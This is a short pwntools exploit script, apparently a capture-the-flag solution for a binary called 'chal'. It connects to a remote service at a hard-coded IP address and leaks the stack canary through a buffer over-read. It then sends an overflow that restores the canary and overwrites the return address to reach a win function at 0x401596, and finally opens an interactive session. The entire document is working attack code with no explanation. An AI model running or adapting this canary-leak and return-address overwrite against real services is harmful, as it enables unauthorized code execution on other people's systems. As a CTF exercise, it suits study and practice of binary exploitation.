from pwn import *

# canary leak and ret2win

elf = ELF('./chal')
#io = process(elf.path)
io = remote('34.70.212.151', 8005)
context.binary = elf

payload = b'b'
payload += b'a' * 0x47
payload += b'?'
io.sendafter(b'Enter key : ', payload)

io.recvuntil(b'?')
canary = u64(b'\x00' + io.recv(7))
log.info(f'canary: {hex(canary)}')

payload = b'a' * 0x48
payload += p64(canary)
payload += b'a' * 8
payload += p64(0x401596)
io.sendlineafter(b'Enter key : ', payload)

io.interactive()

